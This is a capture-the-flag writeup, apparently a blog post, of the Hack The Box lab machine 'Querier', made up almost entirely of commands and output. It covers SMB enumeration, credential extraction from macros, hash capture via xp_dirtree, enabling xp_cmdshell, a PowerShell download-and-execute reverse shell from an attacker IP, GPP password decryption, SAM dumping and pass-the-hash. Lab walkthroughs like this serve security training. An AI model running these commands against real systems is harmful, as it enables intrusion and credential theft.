---
layout: post
title: HTB Machine - Querier
subtitle: Writeup
cover-img: /assets/img/Scifi.1920x1080.jpg
thumbnail-img: /assets/img/Scifi.1920x1080.jpg
share-img: /assets/img/Scifi.1920x1080.jpg
tags: [ HTB, Hack the Box]
---

#We see that 445 (SMB) is available so we can perhaps get more info with crackmapexec.

crackmapexec smb 10.10.10.125
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)

#With smbmap we can check the shared files (-L and -N flags) and then check for permission. We needed to try more than once to give us results for some weird reason.

smbmap -H 10.10.10.125 -u 'null'
[+] Guest session   	IP: 10.10.10.125:445	Name: 10.10.10.125                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	

#Continue enumerating the directories. We see a file that we download to our machine with smbclient

smbclient //10.10.10.125/reports -N
smb: \> ls
  .                                   D        0  Tue Jan 29 00:23:48 2019
  ..                                  D        0  Tue Jan 29 00:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019

		5158399 blocks of size 4096. 821963 blocks available

smb: \> get "Currency Volume Report.xlsm"

# opening the file shows nothing. But we get a warning about some macros so we install oletools and examine the file with olevba.

sudo -H pip install -U oletools

olevba Currency\ Volume\ Report.xlsm

#olveba shows a user and a pwd reporting:PcwTWTHRwryjc$c6. We verify the user is not valid but it is valid at a domain level. 

❯ crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6'
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [-] HTB.LOCAL\reporting:PcwTWTHRwryjc$c6 STATUS_NO_LOGON_SERVERS 

❯ crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6

#we check if we can connect with evilrm by checking if the user can winrm but it cannot so no evilrm for us.


crackmapexec winrm 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
HTTP        10.10.10.125    5985   10.10.10.125     [*] http://10.10.10.125:5985/wsman
WINRM       10.10.10.125    5985   10.10.10.125     [-] WORKGROUP\reporting:PcwTWTHRwryjc$c6

#in the NMAP scan we saw that port 1433 is open which is a SQL server. We use sqsh to access it or mssqlclient.py from impacket.

/home/rickybana/.local/bin/mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth

#Once we are in we could try to abuse xp_cmdshell to execute commands.

xp_cmdshell "whoami"

#however permission is denied. Then we could try to see if we can change advanced options. But we do not have permission for that.

sp_configure "show advanced options", 1

#Inside the SQL we could try to check for other folder that are shared at a network level with xp_dirtree command. So we are going to create a fake SMB folder share and capture the credentials the SQL server sents to then crack the hash. First step we create the server: 

/home/rickybana/.local/bin/smbserver.py smbFolder $(pwd) -smb2support 

#we use smbserver to create a folder called smbFolder in the current working directory and we add smb2 support to maximize compatibility. After that in the server we request the folder so we can capture the credentials.

xp_dirtree "\\10.10.14.3\smbFolder\"

# we place the hash inside a file and crack it with john so we get the user and password.  mssql-svc:corporate568

john -w:/usr/share/wordlists/rockyou.txt hash

#we verify if its possible to psexec or winrm with those credentials but we are not able. 

crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
#valid but not pwned so we cannot psexec.

crackmapexec winrm 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
#not valid.

# We reconect to the SQL server with the new credentials and check if we can run commands.

xp_cmdshell "whoami"
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.


#Just like before we are going to change the config to allow changes and the allow the cmdshell execution.

sp_configure "show advanced options", 1

reconfigure

sp_configure "xp_cmdshell", 1

reconfigure

#Then we can execute commands from within the SQL server.

xp_cmdshell "whoami"
xp_cmdshell "ipconfig"

#we are going to invoke a tcp reverse shell with powershell. For that we will use Nishang's invoke-powershelltcp.ps1 from the repo.

https://github.com/samratashok/nishang/tree/master/Shells

# we donwload the script and add a line at the end of the script (which is part of the examples inside the script). That line will tell the machine to run a reverse shell to our machine. So we set a NC client wtih rlwrap to use ctrl+L and other advanced features,set a python webserver and send the command inside the machine to download our script and interpret it.

sudo rlwrap nc -nlvp 443

sudo python -m http.server 80

xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.3/ps.ps1\")"

# If we press ctlr+c the shell would die, we could use the conPtYshell script from github to avoid that. Not a necessary step.

https://github.com/antonioCoco/ConPtyShell

#We should get the interactive console, move to the folder to get the first flag or do a recursive search to find it.

cmd /c dir /r /s user.txt

#we check the access we have. We will see SeImpersonatePrivilege that is a potential way to scalate.

whoami /priv

#we are going to use the powerup script. Modify the script at the end to invoke all checks. This will check with all functions in the script to see more potential ways to scalate.

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

# again we set up the webserver and ask to donwload/interpret it.

sudo python -m http.server 80

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/content/PowerUp.ps1')

#The script finds a password for the admin user that it was in a location, the script automatically decrypted the password.  If we read the location of the file we will se the hash string (in cpassword field).

type "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"

#we can pass this string or the file (groups.xml) to a gpp-decrypt (github) so it cracks the hash. It is easy decrypted cause MS shared the AES key some time ago. We can verify the credentials with crackmapexec and see if winrm can run.

crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)

crackmapexec winrm 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
HTTP        10.10.10.125    5985   10.10.10.125     [*] http://10.10.10.125:5985/wsman
WINRM       10.10.10.125    5985   10.10.10.125     [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)

#we connect via winrm and from there get the flag.

evil-winrm -i 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!'

#We can do the same with psexec.

psexec.py WORKGROUP/Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125 cmd.exe

-----------
#we can dump the SAM and then use the hash for a "pass-the-hash" attack.

crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP --sam
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
SMB         10.10.10.125    445    QUERIER          [+] Dumping SAM hashes
SMB         10.10.10.125    445    QUERIER          Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dcefe78334b42c0ce483b8e1b2886ab:::
SMB         10.10.10.125    445    QUERIER          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.125    445    QUERIER          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.125    445    QUERIER          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5564df813a052fce1f477bf934863870:::
SMB         10.10.10.125    445    QUERIER          mssql-svc:1001:aad3b435b51404eeaad3b435b51404ee:0ac7bd9745e85cbea2fe0fa11f33c588:::
SMB         10.10.10.125    445    QUERIER          reporting:1002:aad3b435b51404eeaad3b435b51404ee:5c8c5434d1c5cfea71d25a364adcc5e8:::
SMB         10.10.10.125    445    QUERIER          [+] Added 6 SAM hashes to the database


wmiexec.py WORKGROUP/Administrator@10.10.10.125 -hashes :2dcefe78334b42c0ce483b8e1b2886ab

#or with crackmapexec, we dont need the password since we have the hash. Here we added -x flag to execute the command in cmd and -X to execute in PS.

crackmapexec smb 10.10.10.125 -u 'Administrator' -H '2dcefe78334b42c0ce483b8e1b2886ab' -d WORKGROUP -x 'whoami'
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\Administrator:2dcefe78334b42c0ce483b8e1b2886ab (Pwn3d!)
SMB         10.10.10.125    445    QUERIER          [+] Executed command 
SMB         10.10.10.125    445    QUERIER          querier\administrator

crackmapexec smb 10.10.10.125 -u 'Administrator' -H '2dcefe78334b42c0ce483b8e1b2886ab' -d WORKGROUP -X 'whoami'
